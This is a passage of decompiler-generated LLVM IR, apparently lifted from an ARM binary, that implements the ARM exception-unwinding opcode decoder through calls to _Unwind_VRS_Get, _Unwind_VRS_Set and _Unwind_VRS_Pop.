  br i1 %v2_17a60, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_17a5c
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_17a5c, %bb147
  %v2_17a68 = icmp eq i8 %v3_17a5c, 0
  store i1 %v2_17a68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17a68, label %dec_label_pc_17a78, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_17a6c = add nsw i32 %v4_17a5c, -1
  store i32 %v2_17a6c, i32* %r3.global-to-local, align 4
  %v2_17a70 = trunc i32 %v2_17a6c to i8
  store i8 %v2_17a70, i8* %v2_17a5c, align 1
  %v0_17a74.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17a74.pr.pr, label %.thread6.dec_label_pc_17a78_crit_edge, label %dec_label_pc_179a4

.thread6.dec_label_pc_17a78_crit_edge:            ; preds = %.thread6
  %v0_17a78.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17a78

dec_label_pc_17a78:                               ; preds = %bb148, %.thread6.dec_label_pc_17a78_crit_edge
  %v0_17a78 = phi i32 [ %v0_17a78.pre, %.thread6.dec_label_pc_17a78_crit_edge ], [ %v0_17a5c, %bb148 ]
  %v1_17a78 = add i32 %v0_17a78, 9
  %v2_17a78 = inttoptr i32 %v1_17a78 to i8*
  %v3_17a78 = load i8, i8* %v2_17a78, align 1
  %v4_17a78 = zext i8 %v3_17a78 to i32
  store i32 %v4_17a78, i32* %r3.global-to-local, align 4
  %v2_17a7c = icmp eq i8 %v3_17a78, 0
  store i1 %v2_17a7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17a7c, label %dec_label_pc_17a84, label %dec_label_pc_17988

dec_label_pc_17a84:                               ; preds = %dec_label_pc_17a78, %dec_label_pc_1797c, %dec_label_pc_179a4
  %v0_17a84 = load i32, i32* @sl, align 4
  %v2_17a84 = icmp eq i32 %v0_17a84, 0
  store i1 %v2_17a84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17a84, label %dec_label_pc_17b4c, label %bb149

bb149:                                            ; preds = %dec_label_pc_17a84
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17a90

dec_label_pc_17a90:                               ; preds = %bb149, %dec_label_pc_18000, %dec_label_pc_17ea0, %dec_label_pc_17cc4, %dec_label_pc_17c7c, %dec_label_pc_17c38, %dec_label_pc_17b4c
  %v1_17a98 = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_18000 ], [ 9, %dec_label_pc_17ea0 ], [ 9, %dec_label_pc_17cc4 ], [ 9, %dec_label_pc_17c7c ], [ 9, %dec_label_pc_17c38 ], [ %v0_17b80, %dec_label_pc_17b4c ]
  store i32 %v9_17954, i32* %r6.global-to-local, align 4
  store i32 %v21_17954, i32* @lr, align 4
  ret i32 %v1_17a98

dec_label_pc_17a9c:                               ; preds = %dec_label_pc_179c0
  %v1_17a9c = mul i32 %v0_179c0, 4
  %v3_17aa0 = and i32 %v1_17a9c, 252
  store i32 %v3_17aa0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_17aac = load i32, i32* @r7, align 4
  store i32 %v0_17aac, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_17ab4 = add nuw nsw i32 %v3_17aa0, 4
  store i32 %v1_17ab4, i32* %r6.global-to-local, align 4
  %v5_17abc = call i32 @_Unwind_VRS_Get(i32 %v0_17aac, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_17ac0 = load i32, i32* @r4, align 4
  %v1_17ac0 = and i32 %v0_17ac0, 64
  %v2_17ac0 = icmp eq i32 %v1_17ac0, 0
  store i1 %v2_17ac0, i1* %cpsr_z.global-to-local, align 1
  %v4_17ac8 = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_17ad4 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_17ad4
  %storemerge160.p = select i1 %v2_17ac0, i32 %v2_17ad4, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_17ac8
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_17af0 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_17af0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17968.backedge

dec_label_pc_17968.backedge:                      ; preds = %dec_label_pc_17a9c, %dec_label_pc_17b18, %dec_label_pc_17f9c, %dec_label_pc_17c68, %dec_label_pc_17ca0, %dec_label_pc_17c20, %dec_label_pc_17e8c
  %v0_17968.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17968

dec_label_pc_17af8:                               ; preds = %dec_label_pc_179c8
  %v7_17af8 = icmp eq i32 %v1_179c8, 144
  store i1 %v7_17af8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17af8, label %dec_label_pc_17b00, label %dec_label_pc_17c40

dec_label_pc_17b00:                               ; preds = %dec_label_pc_17af8
  %v1_17b00 = urem i32 %v0_179c0, 16
  store i32 %v1_17b00, i32* %r2.global-to-local, align 4
  %v2_17b04 = icmp eq i32 %v1_17b00, 15
  store i1 %v2_17b04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17b04, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_17b00
  %v8_17b08 = icmp eq i32 %v1_17b00, 13
  store i1 %v8_17b08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_17b08, label %bb154, label %dec_label_pc_17b18

.thread21:                                        ; preds = %dec_label_pc_17b00
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17c38

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17c38

dec_label_pc_17b18:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_17b24 = load i32, i32* @r7, align 4
  store i32 %v0_17b24, i32* %r0.global-to-local, align 4
  %v5_17b2c = call i32 @_Unwind_VRS_Get(i32 %v0_17b24, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_17b34 = load i32, i32* @r7, align 4
  store i32 %v0_17b34, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_17b44 = call i32 @_Unwind_VRS_Set(i32 %v0_17b34, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_17b44, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17968.backedge

dec_label_pc_17b4c:                               ; preds = %dec_label_pc_17a84
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_17b5c = load i32, i32* @r7, align 4
  store i32 %v0_17b5c, i32* %r0.global-to-local, align 4
  %v7_17b64 = call i32 @_Unwind_VRS_Get(i32 %v0_17b5c, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_17b68 = load i32, i32* @r7, align 4
  store i32 %v0_17b68, i32* %r0.global-to-local, align 4
  %v0_17b6c = load i32, i32* @sl, align 4
  store i32 %v0_17b6c, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_17b6c, i32* %r3.global-to-local, align 4
  %v5_17b7c = call i32 @_Unwind_VRS_Set(i32 %v0_17b68, i32 %v0_17b6c, i32 15, i32 %v0_17b6c, i8* bitcast (i32* @0 to i8*))
  %v0_17b80 = load i32, i32* @sl, align 4
  store i32 %v0_17b80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17a90

dec_label_pc_17b88:                               ; preds = %dec_label_pc_17d7c
  %v7_17b88 = icmp eq i32 %v0_17d7c, 199
  store i1 %v7_17b88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17b88, label %dec_label_pc_17e5c, label %dec_label_pc_17b90

dec_label_pc_17b90:                               ; preds = %dec_label_pc_17b88
  %v1_17b90 = and i32 %v0_179c0, 248
  store i32 %v1_17b90, i32* %r3.global-to-local, align 4
  %v7_17b94 = icmp eq i32 %v1_17b90, 192
  store i1 %v7_17b94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17b94, label %.thread24, label %dec_label_pc_17bac

.thread24:                                        ; preds = %dec_label_pc_17b90
  %v2_17b98 = urem i32 %v0_179c0, 16
  %v2_17b9c = add nuw nsw i32 %v2_17b98, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_17ba4 = or i32 %v2_17b9c, 655360
  store i32 %v2_17ba4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17c68

dec_label_pc_17bac:                               ; preds = %dec_label_pc_17b90
  %v7_17bac = icmp eq i32 %v0_17d7c, 200
  store i1 %v7_17bac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17bac, label %dec_label_pc_17df0, label %dec_label_pc_17bb4

dec_label_pc_17bb4:                               ; preds = %dec_label_pc_17bac
  %v7_17bb4 = icmp eq i32 %v0_17d7c, 201
  store i1 %v7_17bb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17bb4, label %dec_label_pc_17bbc, label %dec_label_pc_17c38

dec_label_pc_17bbc:                               ; preds = %dec_label_pc_17bb4
  %v0_17bbc = load i32, i32* @r5, align 4
  %v1_17bbc = add i32 %v0_17bbc, 8
  %v2_17bbc = inttoptr i32 %v1_17bbc to i8*
  %v3_17bbc = load i8, i8* %v2_17bbc, align 1
  %v4_17bbc = zext i8 %v3_17bbc to i32
  store i32 %v4_17bbc, i32* %r3.global-to-local, align 4
  %v2_17bc0 = icmp eq i8 %v3_17bbc, 0
  store i1 %v2_17bc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17bc0, label %dec_label_pc_17bd0, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_17bbc
  %v2_17bc4 = add nsw i32 %v4_17bbc, -1
  store i32 %v2_17bc4, i32* %r3.global-to-local, align 4
  %v2_17bc8 = trunc i32 %v2_17bc4 to i8
  store i8 %v2_17bc8, i8* %v2_17bbc, align 1
  %v0_17bcc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17bcc.pr.pr, label %.thread26.dec_label_pc_17bd0_crit_edge, label %dec_label_pc_17c04

.thread26.dec_label_pc_17bd0_crit_edge:           ; preds = %.thread26
  %v0_17bd0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17bd0

dec_label_pc_17bd0:                               ; preds = %.thread26.dec_label_pc_17bd0_crit_edge, %dec_label_pc_17bbc
  %v2_17be8 = phi i32 [ %v0_17bd0.pre, %.thread26.dec_label_pc_17bd0_crit_edge ], [ %v0_17bbc, %dec_label_pc_17bbc ]
  %v1_17bd0 = add i32 %v2_17be8, 9
  %v2_17bd0 = inttoptr i32 %v1_17bd0 to i8*
  %v3_17bd0 = load i8, i8* %v2_17bd0, align 1
  %v4_17bd0 = zext i8 %v3_17bd0 to i32
  store i32 %v4_17bd0, i32* %r3.global-to-local, align 4
  %v2_17bd4 = icmp eq i8 %v3_17bd0, 0
  store i1 %v2_17bd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17bd4, label %dec_label_pc_17c20, label %dec_label_pc_17be4

dec_label_pc_17be4:                               ; preds = %dec_label_pc_17bd0
  %v1_17be4 = add nsw i32 %v4_17bd0, -1
  store i32 %v1_17be4, i32* %r3.global-to-local, align 4
  %v1_17be8 = trunc i32 %v1_17be4 to i8
  store i8 %v1_17be8, i8* %v2_17bd0, align 1
  %v0_17bec = load i32, i32* @r5, align 4
  %v1_17bec = add i32 %v0_17bec, 4
  %v2_17bec = inttoptr i32 %v1_17bec to i32*
  %v3_17bec = load i32, i32* %v2_17bec, align 4
  store i32 %v3_17bec, i32* %r2.global-to-local, align 4
  %v1_17bf0 = inttoptr i32 %v3_17bec to i32*
  %v2_17bf0 = load i32, i32* %v1_17bf0, align 4
  store i32 %v2_17bf0, i32* %r0.global-to-local, align 4
  %v4_17bf0 = add i32 %v3_17bec, 4
  store i32 %v4_17bf0, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_17bf0, i32* %v2_17bec, align 4
  %v0_17bfc = load i32, i32* %r3.global-to-local, align 4
  %v1_17bfc = trunc i32 %v0_17bfc to i8
  %v2_17bfc = load i32, i32* @r5, align 4
  %v3_17bfc = add i32 %v2_17bfc, 8
  %v4_17bfc = inttoptr i32 %v3_17bfc to i8*
  store i8 %v1_17bfc, i8* %v4_17bfc, align 1
  %v0_17c00 = load i32, i32* %r0.global-to-local, align 4
  %v1_17c00 = load i32, i32* @r5, align 4
  %v2_17c00 = inttoptr i32 %v1_17c00 to i32*
  store i32 %v0_17c00, i32* %v2_17c00, align 4
  br label %dec_label_pc_17c04

dec_label_pc_17c04:                               ; preds = %.thread26, %dec_label_pc_17be4
  %v0_17c04 = load i32, i32* %r0.global-to-local, align 4
  %v3_17c04 = udiv i32 %v0_17c04, 16777216
  %v1_17c08 = urem i32 %v3_17c04, 16
  %v3_17c0c = mul i32 %v0_17c04, 256
  %v1_17c10 = add nuw nsw i32 %v1_17c08, 1
  store i32 %v1_17c10, i32* %r1.global-to-local, align 4
  %v1_17c14 = and i32 %v3_17c04, 240
  store i32 %v1_17c14, i32* %r3.global-to-local, align 4
  %v1_17c18 = load i32, i32* @r5, align 4
  %v2_17c18 = inttoptr i32 %v1_17c18 to i32*
  store i32 %v3_17c0c, i32* %v2_17c18, align 4
  %v0_17c1c = load i32, i32* %r1.global-to-local, align 4
  %v1_17c1c = load i32, i32* %r3.global-to-local, align 4
  %v4_17c1c = mul i32 %v1_17c1c, 4096
  %v5_17c1c = or i32 %v4_17c1c, %v0_17c1c
  br label %dec_label_pc_17c20

dec_label_pc_17c20:                               ; preds = %dec_label_pc_17bd0, %dec_label_pc_17c04
  %storemerge = phi i32 [ %v5_17c1c, %dec_label_pc_17c04 ], [ 720897, %dec_label_pc_17bd0 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_17c20 = load i32, i32* @r7, align 4
  store i32 %v0_17c20, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_17c2c = call i32 @_Unwind_VRS_Pop(i32 %v0_17c20, i32 1, i32 5, i32 5)
  store i32 %v4_17c2c, i32* %r0.global-to-local, align 4
  %v2_17c30 = icmp eq i32 %v4_17c2c, 0
  store i1 %v2_17c30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17c30, label %dec_label_pc_17968.backedge, label %dec_label_pc_17c38

dec_label_pc_17c38:                               ; preds = %dec_label_pc_17e84, %dec_label_pc_17bb4, %dec_label_pc_17c94, %dec_label_pc_18038, %dec_label_pc_18008, %dec_label_pc_17fe4, %dec_label_pc_17e70, %dec_label_pc_17c20, %dec_label_pc_17a34, %dec_label_pc_17a28, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17a90

dec_label_pc_17c40:                               ; preds = %dec_label_pc_17af8
  %v7_17c40 = icmp eq i32 %v1_179c8, 160
  store i1 %v7_17c40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17c40, label %dec_label_pc_17c48, label %dec_label_pc_17c84

dec_label_pc_17c48:                               ; preds = %dec_label_pc_17c40
  %v0_17c48 = load i32, i32* %ip.global-to-local, align 4
  %v1_17c48 = urem i32 %v0_17c48, 8
  %v1_17c4c = xor i32 %v1_17c48, 7
  store i32 %v1_17c4c, i32* %r3.global-to-local, align 4
  %v6_17c54 = lshr i32 4080, %v1_17c4c
  %v1_17c58 = and i32 %v0_179c0, 8
  %v2_17c58 = icmp eq i32 %v1_17c58, 0
  store i1 %v2_17c58, i1* %cpsr_z.global-to-local, align 1
  %v1_17c5c = and i32 %v6_17c54, 4080
  %tmp155 = mul nuw nsw i32 %v1_17c58, 2048
  %tmp156 = or i32 %v1_17c5c, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17c68

dec_label_pc_17c68:                               ; preds = %.thread44, %.thread24, %dec_label_pc_17ff8.dec_label_pc_17c68_crit_edge, %bb157, %dec_label_pc_17e54, %dec_label_pc_17de8, %dec_label_pc_17d48, %dec_label_pc_17c48
  %v2_17c70 = phi i32 [ %v2_17d6c, %.thread44 ], [ %v2_17d74, %bb157 ], [ %v2_17c70.pre, %dec_label_pc_17ff8.dec_label_pc_17c68_crit_edge ], [ %v2_17ba4, %.thread24 ], [ %storemerge130, %dec_label_pc_17e54 ], [ %storemerge131, %dec_label_pc_17de8 ], [ %storemerge132, %dec_label_pc_17d48 ], [ %tmp156, %dec_label_pc_17c48 ]
  %v0_17c6c = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_17ff8.dec_label_pc_17c68_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_17e54 ], [ 3, %dec_label_pc_17de8 ], [ 1, %dec_label_pc_17d48 ], [ 0, %dec_label_pc_17c48 ]
  %v0_17c68 = load i32, i32* @r7, align 4
  store i32 %v0_17c68, i32* %r0.global-to-local, align 4
  store i32 %v0_17c6c, i32* %r3.global-to-local, align 4
  %v4_17c70 = call i32 @_Unwind_VRS_Pop(i32 %v0_17c68, i32 %v0_17c6c, i32 %v2_17c70, i32 %v0_17c6c)
  store i32 %v4_17c70, i32* %r0.global-to-local, align 4
  %v2_17c74 = icmp eq i32 %v4_17c70, 0
  store i1 %v2_17c74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17c74, label %dec_label_pc_17968.backedge, label %dec_label_pc_17c7c

dec_label_pc_17c7c:                               ; preds = %dec_label_pc_17c68
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17a90

dec_label_pc_17c84:                               ; preds = %dec_label_pc_17c40
  %v7_17c84 = icmp eq i32 %v1_179c8, 176
  store i1 %v7_17c84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17c84, label %dec_label_pc_17ccc, label %dec_label_pc_17c8c

dec_label_pc_17c8c:                               ; preds = %dec_label_pc_17c84
  %v7_17c8c = icmp eq i32 %v1_179c8, 192
  store i1 %v7_17c8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17c8c, label %dec_label_pc_17d7c, label %dec_label_pc_17c94

dec_label_pc_17c94:                               ; preds = %dec_label_pc_17c8c
  %v1_17c94 = and i32 %v0_179c0, 248
  store i32 %v1_17c94, i32* %r3.global-to-local, align 4
  %v7_17c98 = icmp eq i32 %v1_17c94, 208
  store i1 %v7_17c98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17c98, label %dec_label_pc_17ca0, label %dec_label_pc_17c38

dec_label_pc_17ca0:                               ; preds = %dec_label_pc_17c94
  %v1_17ca0 = urem i32 %v0_179c0, 8
  %v1_17ca4 = add nuw nsw i32 %v1_17ca0, 1
  %v1_17ca8 = or i32 %v1_17ca4, 524288
  store i32 %v1_17ca8, i32* %r2.global-to-local, align 4
  %v0_17cac = load i32, i32* @r7, align 4
  store i32 %v0_17cac, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_17cb8 = call i32 @_Unwind_VRS_Pop(i32 %v0_17cac, i32 1, i32 %v1_17ca8, i32 5)
  store i32 %v4_17cb8, i32* %r0.global-to-local, align 4
  %v2_17cbc = icmp eq i32 %v4_17cb8, 0
  store i1 %v2_17cbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17cbc, label %dec_label_pc_17968.backedge, label %dec_label_pc_17cc4

dec_label_pc_17cc4:                               ; preds = %dec_label_pc_17ca0
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17a90

dec_label_pc_17ccc:                               ; preds = %dec_label_pc_17c84
  %v0_17ccc = load i32, i32* %ip.global-to-local, align 4
  %v7_17ccc = icmp eq i32 %v0_17ccc, 177
  store i1 %v7_17ccc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17ccc, label %dec_label_pc_17fd0, label %dec_label_pc_17cd4

dec_label_pc_17cd4:                               ; preds = %dec_label_pc_17ccc
  %v7_17cd4 = icmp eq i32 %v0_17ccc, 178
  store i1 %v7_17cd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17cd4, label %dec_label_pc_17ea8, label %dec_label_pc_17cdc

dec_label_pc_17cdc:                               ; preds = %dec_label_pc_17cd4
  %v7_17cdc = icmp eq i32 %v0_17ccc, 179
  store i1 %v7_17cdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17cdc, label %dec_label_pc_17ce4, label %dec_label_pc_17d50

dec_label_pc_17ce4:                               ; preds = %dec_label_pc_17cdc
  %v0_17ce4 = load i32, i32* @r5, align 4
  %v1_17ce4 = add i32 %v0_17ce4, 8
  %v2_17ce4 = inttoptr i32 %v1_17ce4 to i8*
  %v3_17ce4 = load i8, i8* %v2_17ce4, align 1
  %v4_17ce4 = zext i8 %v3_17ce4 to i32
  store i32 %v4_17ce4, i32* %r3.global-to-local, align 4
  %v2_17ce8 = icmp eq i8 %v3_17ce4, 0
  store i1 %v2_17ce8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17ce8, label %dec_label_pc_17cf8, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_17ce4
  %v2_17cec = add nsw i32 %v4_17ce4, -1
  store i32 %v2_17cec, i32* %r3.global-to-local, align 4
  %v2_17cf0 = trunc i32 %v2_17cec to i8
  store i8 %v2_17cf0, i8* %v2_17ce4, align 1
  %v0_17cf4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17cf4.pr.pr, label %.thread30.dec_label_pc_17cf8_crit_edge, label %dec_label_pc_17d2c

.thread30.dec_label_pc_17cf8_crit_edge:           ; preds = %.thread30
  %v0_17cf8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17cf8

dec_label_pc_17cf8:                               ; preds = %.thread30.dec_label_pc_17cf8_crit_edge, %dec_label_pc_17ce4
  %v2_17d10 = phi i32 [ %v0_17cf8.pre, %.thread30.dec_label_pc_17cf8_crit_edge ], [ %v0_17ce4, %dec_label_pc_17ce4 ]
  %v1_17cf8 = add i32 %v2_17d10, 9
  %v2_17cf8 = inttoptr i32 %v1_17cf8 to i8*
  %v3_17cf8 = load i8, i8* %v2_17cf8, align 1
  %v4_17cf8 = zext i8 %v3_17cf8 to i32
  store i32 %v4_17cf8, i32* %r3.global-to-local, align 4
  %v2_17cfc = icmp eq i8 %v3_17cf8, 0
  store i1 %v2_17cfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17cfc, label %dec_label_pc_17d48, label %dec_label_pc_17d0c

dec_label_pc_17d0c:                               ; preds = %dec_label_pc_17cf8
  %v1_17d0c = add nsw i32 %v4_17cf8, -1
  store i32 %v1_17d0c, i32* %r3.global-to-local, align 4
  %v1_17d10 = trunc i32 %v1_17d0c to i8
  store i8 %v1_17d10, i8* %v2_17cf8, align 1
  %v0_17d14 = load i32, i32* @r5, align 4
  %v1_17d14 = add i32 %v0_17d14, 4
  %v2_17d14 = inttoptr i32 %v1_17d14 to i32*
  %v3_17d14 = load i32, i32* %v2_17d14, align 4
  store i32 %v3_17d14, i32* %r2.global-to-local, align 4
  %v1_17d18 = inttoptr i32 %v3_17d14 to i32*
  %v2_17d18 = load i32, i32* %v1_17d18, align 4
  store i32 %v2_17d18, i32* %r0.global-to-local, align 4
  %v4_17d18 = add i32 %v3_17d14, 4
  store i32 %v4_17d18, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_17d18, i32* %v2_17d14, align 4
  %v0_17d24 = load i32, i32* %r3.global-to-local, align 4
  %v1_17d24 = trunc i32 %v0_17d24 to i8
  %v2_17d24 = load i32, i32* @r5, align 4
  %v3_17d24 = add i32 %v2_17d24, 8
  %v4_17d24 = inttoptr i32 %v3_17d24 to i8*
  store i8 %v1_17d24, i8* %v4_17d24, align 1
  %v0_17d28 = load i32, i32* %r0.global-to-local, align 4
  %v1_17d28 = load i32, i32* @r5, align 4
  %v2_17d28 = inttoptr i32 %v1_17d28 to i32*
  store i32 %v0_17d28, i32* %v2_17d28, align 4
  br label %dec_label_pc_17d2c

dec_label_pc_17d2c:                               ; preds = %.thread30, %dec_label_pc_17d0c
  %v0_17d2c = load i32, i32* %r0.global-to-local, align 4
  %v3_17d2c = udiv i32 %v0_17d2c, 16777216
  %v1_17d30 = urem i32 %v3_17d2c, 16
  %v3_17d34 = mul i32 %v0_17d2c, 256
  store i32 %v3_17d34, i32* %r0.global-to-local, align 4
  %v1_17d38 = add nuw nsw i32 %v1_17d30, 1
  store i32 %v1_17d38, i32* %r2.global-to-local, align 4
  %v1_17d3c = and i32 %v3_17d2c, 240
  store i32 %v1_17d3c, i32* %r3.global-to-local, align 4
  %v1_17d40 = load i32, i32* @r5, align 4
  %v2_17d40 = inttoptr i32 %v1_17d40 to i32*
  store i32 %v3_17d34, i32* %v2_17d40, align 4
  %v0_17d44 = load i32, i32* %r2.global-to-local, align 4
  %v1_17d44 = load i32, i32* %r3.global-to-local, align 4
  %v4_17d44 = mul i32 %v1_17d44, 4096
  %v5_17d44 = or i32 %v4_17d44, %v0_17d44
  br label %dec_label_pc_17d48

dec_label_pc_17d48:                               ; preds = %dec_label_pc_17cf8, %dec_label_pc_17d2c
  %storemerge132 = phi i32 [ %v5_17d44, %dec_label_pc_17d2c ], [ 720897, %dec_label_pc_17cf8 ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17c68

dec_label_pc_17d50:                               ; preds = %dec_label_pc_17cdc
  %v1_17d50 = and i32 %v0_179c0, 252
  store i32 %v1_17d50, i32* %r3.global-to-local, align 4
  %v7_17d54 = icmp eq i32 %v1_17d50, 180
  store i1 %v7_17d54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17d54, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_17d50
  %v2_17d58 = urem i32 %v0_179c0, 4
  %v2_17d60 = add nuw nsw i32 %v2_17d58, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_17d6c = or i32 %v2_17d60, 262144
  store i32 %v2_17d6c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17c68

bb157:                                            ; preds = %dec_label_pc_17d50
  %v2_17d5c = urem i32 %v0_17ccc, 8
  %v2_17d64 = add nuw nsw i32 %v2_17d5c, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_17d74 = or i32 %v2_17d64, 524288
  store i32 %v2_17d74, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17c68

dec_label_pc_17d7c:                               ; preds = %dec_label_pc_17c8c
  %v0_17d7c = load i32, i32* %ip.global-to-local, align 4
  %v7_17d7c = icmp eq i32 %v0_17d7c, 198
  store i1 %v7_17d7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17d7c, label %dec_label_pc_17d84, label %dec_label_pc_17b88

dec_label_pc_17d84:                               ; preds = %dec_label_pc_17d7c
  %v0_17d84 = load i32, i32* @r5, align 4
  %v1_17d84 = add i32 %v0_17d84, 8
  %v2_17d84 = inttoptr i32 %v1_17d84 to i8*
  %v3_17d84 = load i8, i8* %v2_17d84, align 1
  %v4_17d84 = zext i8 %v3_17d84 to i32
  store i32 %v4_17d84, i32* %r3.global-to-local, align 4
  %v2_17d88 = icmp eq i8 %v3_17d84, 0
  store i1 %v2_17d88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17d88, label %dec_label_pc_17d98, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_17d84
  %v2_17d8c = add nsw i32 %v4_17d84, -1
  store i32 %v2_17d8c, i32* %r3.global-to-local, align 4
  %v2_17d90 = trunc i32 %v2_17d8c to i8
  store i8 %v2_17d90, i8* %v2_17d84, align 1
  %v0_17d94.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17d94.pr.pr, label %.thread48.dec_label_pc_17d98_crit_edge, label %dec_label_pc_17dcc

.thread48.dec_label_pc_17d98_crit_edge:           ; preds = %.thread48
  %v0_17d98.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17d98

dec_label_pc_17d98:                               ; preds = %.thread48.dec_label_pc_17d98_crit_edge, %dec_label_pc_17d84
  %v2_17db0 = phi i32 [ %v0_17d98.pre, %.thread48.dec_label_pc_17d98_crit_edge ], [ %v0_17d84, %dec_label_pc_17d84 ]
  %v1_17d98 = add i32 %v2_17db0, 9
  %v2_17d98 = inttoptr i32 %v1_17d98 to i8*
  %v3_17d98 = load i8, i8* %v2_17d98, align 1
  %v4_17d98 = zext i8 %v3_17d98 to i32
  store i32 %v4_17d98, i32* %r3.global-to-local, align 4
  %v2_17d9c = icmp eq i8 %v3_17d98, 0
  store i1 %v2_17d9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17d9c, label %dec_label_pc_17de8, label %dec_label_pc_17dac

